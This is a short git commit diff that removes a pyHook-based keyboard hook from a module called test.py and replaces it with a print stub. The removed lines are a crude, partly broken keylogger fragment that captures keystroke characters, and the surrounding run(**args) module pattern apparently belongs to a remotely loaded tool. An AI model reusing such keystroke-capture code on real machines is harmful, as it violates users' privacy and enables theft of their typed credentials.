2a5a1ac4222b5ac82723111ac9256473f5df443f
experiment2016 <sarpiericam@libero.it>
2016-05-30 11:30:57 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -1,15 +1,6 @@
-import pyHook, pythoncom, sys
-
 def run(**args):
   try:
-    def OnKeyboardEvent(event):
-        action = chr(event.Ascii)
-        return str(action)#chr(event.Ascii)
-        return True
-    hooks_manager = pyHook.HookManager ( )
-    hooks_manager.KeyDown = OnKeyboardEvent
-    hooks_manager.HookKeyboard ( )
-    pythoncom.PumpMessages ()
+      print("Testing")   
   except Exception, e:
       return str(e)
   
